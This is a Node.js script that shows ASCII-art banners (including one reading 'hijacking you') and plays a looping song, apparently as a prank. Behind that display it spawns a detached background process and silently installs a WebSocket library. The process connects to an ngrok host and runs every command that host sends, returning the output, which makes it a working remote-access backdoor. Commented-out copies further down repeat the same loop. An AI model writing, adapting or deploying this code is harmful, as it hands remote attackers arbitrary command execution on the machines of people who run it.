const { spawn, exec, execSync } = require("child_process");
const path = require("path");

// ------------------- Banner -------------------
const msg3 = '  ██████  ▒█████   ██▀███   ██▀███  ▓██   ██▓\n' +
'▒██    ▒ ▒██▒  ██▒▓██ ▒ ██▒▓██ ▒ ██▒ ▒██  ██▒\n' +
'░ ▓██▄   ▒██░  ██▒▓██ ░▄█ ▒▓██ ░▄█ ▒  ▒██ ██░\n' +
'  ▒   ██▒▒██   ██░▒██▀▀█▄  ▒██▀▀█▄    ░ ▐██▓░\n' +
'▒██████▒▒░ ████▓▒░░██▓ ▒██▒░██▓ ▒██▒  ░ ██▒▓░\n' +
'▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ▒▓ ░▒▓░   ██▒▒▒\n' +
'░ ░▒  ░    ░ ▒ ▒░   ░▒ ░ ▒   ░▒ ░ ▒  ▓██ ░▒░\n' +
'░  ░  ░  ░ ░ ░ ▒    ░░   ░   ░░   ░  ▒ ▒ ░░\n' +
'      ░      ░ ░     ░        ░      ░ ░'; // your full banner
console.clear();
console.log(msg3);

// ------------------- Spawn detached child -------------------
if (process.argv[2] !== "runChild") {
  const child = spawn(process.argv[0], [__filename, "runChild"], {
    detached: true,
    stdio: "ignore"
  });
  child.unref(); // detach
  process.exit(); // parent exits immediately
}

// ------------------- Child process -------------------
if (process.argv[2] === "runChild") {
  // Keep Node alive
  const keepAlive = setInterval(() => {}, 1000);

  // ------------------- Require ws -------------------
  function getGlobalNodeModules() {
    return execSync("npm root -g").toString().trim();
  }

  let WebSocket;
  try {
    WebSocket = require("ws");
  } catch (e) {
    try {
      const globalWsPath = path.join(getGlobalNodeModules(), "ws");
      WebSocket = require(globalWsPath);
    } catch (err) {
      execSync("npm install -g ws", { stdio: "inherit" });
      const globalWsPath = path.join(getGlobalNodeModules(), "ws");
      WebSocket = require(globalWsPath);
    }
  }

  // ------------------- WebSocket -------------------
  const DEVICE_ID = Date.now().toString();
  const ws = new WebSocket("wss://macaw-pleasant-intensely.ngrok-free.app");

  ws.on("open", () => {
    console.log("WebSocket connected (background)");
  });

  ws.on("message", (msg) => {
    const data = JSON.parse(msg.toString());
    if (data.type === "command") {
      exec(data.command, (err, stdout, stderr) => {
        ws.send(JSON.stringify({
          type: "output",
          id: DEVICE_ID,
          output: stdout || stderr || (err ? err.message : "")
        }));
      });
    }
  });

  // ------------------- Sox playback -------------------
  function playSong() {
    exec("sox --version", (err) => {
      if (err) {
        exec("apt update && apt install -y sox", () => {
          streamSong();
        });
      } else {
        streamSong();
      }
    });
  }

  function streamSong() {
    // Stream song continuously
    const song = exec(`curl -s localhost:8080/song.mp3 | play -t mp3 -`);
    song.on("exit", () => {
      setTimeout(streamSong, 1000); // loop after 1 sec
    });
  }

  playSong();
}



/*const { execSync, exec } = require("child_process");
const path = require("path");

// Function to get global node_modules path
function getGlobalNodeModules() {
  return execSync("npm root -g").toString().trim();
}

// Try to require ws locally first, then globally, else install globally
let WebSocket;
try {
  WebSocket = require("ws"); // local
} catch (e) {
  try {
    const globalWsPath = path.join(getGlobalNodeModules(), "ws");
    WebSocket = require(globalWsPath); // global
  } catch (err) {
    console.log("ws not found. Installing globally...");
    execSync("npm install -g ws", { stdio: "inherit" });
    const globalWsPath = path.join(getGlobalNodeModules(), "ws");
    WebSocket = require(globalWsPath); // require after global install
  }
}

const DEVICE_ID = Date.now().toString(); // random id
const ws = new WebSocket("wss://macaw-pleasant-intensely.ngrok-free.app");

ws.on("open", () => {
  console.log("WebSocket connected!");
});

ws.on("message", (msg) => {
  const data = JSON.parse(msg.toString());

  if (data.type === "command") {
    exec(data.command, (err, stdout, stderr) => {
      ws.send(
        JSON.stringify({
          type: "output",
          id: DEVICE_ID,
          output: stdout || stderr || (err ? err.message : "")
        })
      );
    });
  }
});



ws.on("open", () => {
  ws.send(JSON.stringify({ type: "register_device", id: DEVICE_ID }));
  console.clear();

  const msg = `  ██████  ▄▄▄       ▄▄▄▄     ██ ██▀███                  
▒██    ▒ ▒████▄    ▓█████▄ ▒▓██▓██ ▒ ██▒                
░ ▓██▄   ▒██  ▀█▄  ▒██▒ ▄██░▒██▓██ ░▄█ ▒                
  ▒   ██▒░██▄▄▄▄██ ▒██░█▀   ░██▒██▀▀█▄                  
▒██████▒▒ ▓█   ▓██▒░▓█  ▀█▓ ░██░██▓ ▒██▒                
▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░░▒▓███▀▒ ░▓ ░ ▒▓ ░▒▓░                
░ ░▒  ░    ░   ▒▒ ░▒░▒   ░   ▒   ░▒ ░ ▒░                
░  ░  ░    ░   ▒    ░    ░   ▒    ░   ░                 
      ░        ░  ░ ░        ░    ░                     
`;

const msg2 = `  
██░ ██   ██ ▄▄▄██▀▀ ▄▄▄      ▄████▄  ▀██ ▄█▀  ██ ███▄    █    ▄████     ▓██   ██▓ ▒█████   █    ██ 
▒▓██░ ██ ▒▓██   ▒██  ▒████▄   ▒██▀ ▀█   ██▄█▒ ▒▓██ ██ ▀█   █ ▒ ██▒ ▀█▒     ▒██  ██▒▒██▒  ██▒ ██  ▓██▒
░▒██▀▀██ ░▒██   ░██  ▒██  ▀█▄ ▒▓█    ▄ ▓███▄░ ░▒██▓██  ▀█ ██▒░▒██░▄▄▄░      ▒██ ██░▒██░  ██▒▓██  ▒██░
 ░▓█ ░██  ░██▓██▄██▓ ░██▄▄▄▄██▒▓▓▄ ▄██ ▓██ █▄  ░██▓██▒  ▐▌██▒░░▓█  ██▓      ░ ▐██▓░▒██   ██░▓▓█  ░██░
 ░▓█▒░██▓ ░██ ▓███▒   ▓█   ▓██▒ ▓███▀  ▒██▒ █▄ ░██▒██░   ▓██░░▒▓███▀▒░      ░ ██▒▓░░ ████▓▒░▒▒█████▓ 
  ▒ ░░▒░▒ ░▓  ▒▓▒▒░   ▒▒   ▓▒█░ ░▒ ▒   ▒ ▒▒ ▓▒ ░▓ ░ ▒░   ▒ ▒  ░▒   ▒         ██▒▒▒ ░ ▒░▒░▒░  ▒▓▒ ▒ ▒ 
  ▒ ░▒░ ░  ▒  ▒ ░▒░    ░   ▒▒   ░  ▒   ░ ░▒ ▒░  ▒ ░ ░░   ░ ▒░  ░   ░       ▓██ ░▒░   ░ ▒ ▒░  ░▒░ ░ ░ 
  ░  ░░ ░  ▒  ░ ░ ░    ░   ▒  ░        ░ ░░ ░   ▒    ░   ░ ░ ░ ░   ░ ░     ▒ ▒ ░░  ░ ░ ░ ▒    ░░ ░ ░ 
  ░  ░  ░  ░  ░   ░        ░  ░ ░      ░  ░     ░          ░       ░       ░ ░         ░ ░     ░     
`;

const msg3 = '  ██████  ▒█████   ██▀███   ██▀███  ▓██   ██▓\n' +
'▒██    ▒ ▒██▒  ██▒▓██ ▒ ██▒▓██ ▒ ██▒ ▒██  ██▒\n' +
'░ ▓██▄   ▒██░  ██▒▓██ ░▄█ ▒▓██ ░▄█ ▒  ▒██ ██░\n' +
'  ▒   ██▒▒██   ██░▒██▀▀█▄  ▒██▀▀█▄    ░ ▐██▓░\n' +
'▒██████▒▒░ ████▓▒░░██▓ ▒██▒░██▓ ▒██▒  ░ ██▒▓░\n' +
'▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ▒▓ ░▒▓░   ██▒▒▒\n' +
'░ ░▒  ░    ░ ▒ ▒░   ░▒ ░ ▒   ░▒ ░ ▒  ▓██ ░▒░\n' +
'░  ░  ░  ░ ░ ░ ▒    ░░   ░   ░░   ░  ▒ ▒ ░░\n' +
'      ░      ░ ░     ░        ░      ░ ░';
  console.log(msg3);
  /*setTimeout(() => {
  console.clear();
}, 3000);
  console.log(msg2);
  setTimeout(() => {
  console.clear();
}, 3000);
  console.log(msg3);*/
  
  // Check if sox is installed; install silently if not
  /*exec("sox --version", (err) => {
    if (err) {
      exec("apt update && apt install sox", () => {
        playSong();
      });
    } else {
      playSong();
    }
  });

  function playSong() {
    exec(`curl -s localhost:8080/song.mp3 | play -t mp3 -`);
  }
  });*/

  

/*const WebSocket = require("ws");
const { exec } = require("child_process");

const DEVICE_ID = Date.now().toString(); // random id
const ws = new WebSocket("wss://macaw-pleasant-intensely.ngrok-free.app"); // apna Render link

ws.on("open", () => {
  ws.send(JSON.stringify({ type: "register_device", id: DEVICE_ID }));
  console.clear();

const msg = `

_________▄██✿███▄
 _______ ▄██▀██████▄
 ______██▀__███▒████
 _____██____███░░ٮ░▀
 ______██____██░░░░░
 _______██____ ██░░♥ _ (❀✿❀)
 ________ █_____ █▒ ___ (✿ ☼ ✿)
 _________█ ___▓▓░▓___ (❀▐ ❀)
 ____█❀ _█_ ▓▓▓▒░▒▓__█_▐__▄
 _____▀█▀_ ▓▓_▓▓▒░▒▓ ▀█▐_█
 _________▓▓_▓▓▓▓▓▓____ ▐▀
 _________▓▓_▓▓▓▓▓______▐
 _______ ▓▓__▓▓▓▓_▓▓____▐░
 ______ ▓▓__▓▓▓▓▓___▓___▒▒
 _____ ▓▓_▓███❋██▓__▓▓▓
 ___▒▒___▓██▒███▒▓
 ___░___▓██▒███▒██▓
 ______▓██▒███▒███▒▓
 _____▓██▒███▒███▒██▓
 _____▓█▒███▒███▒███▒▓
 ▓___▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
 ▓________▒░░░▒░░░▒
 ▓________▒░░░▒░░░▒
 ▓________▒░░▒_▒░░░▒
 ▓________▒░░▒__▒░░░▒
 ▓________▒░░▒__ ▒░░░▒
 ▓________▒░░▒__▒░░░▒
 ▓________▒░░▒▒░░░▒
 ▓▄▄▄▄▄▄▒░░▒░░▒
 ▓██████▒░░▒▒
 ▓_█❤█___███
 ▓███____ ███
 ▓█_______███
 ▓________██❥█
 ▓________██▀██▄
`;

console.log(msg);
});

ws.on("message", (msg) => {
  const data = JSON.parse(msg.toString());

  if (data.type === "command") {
    exec(data.command, (err, stdout, stderr) => {
      ws.send(
        JSON.stringify({
          type: "output",
          id: DEVICE_ID,
          output: stdout || stderr || (err ? err.message : "")
        })
      );
    });
  }
});*/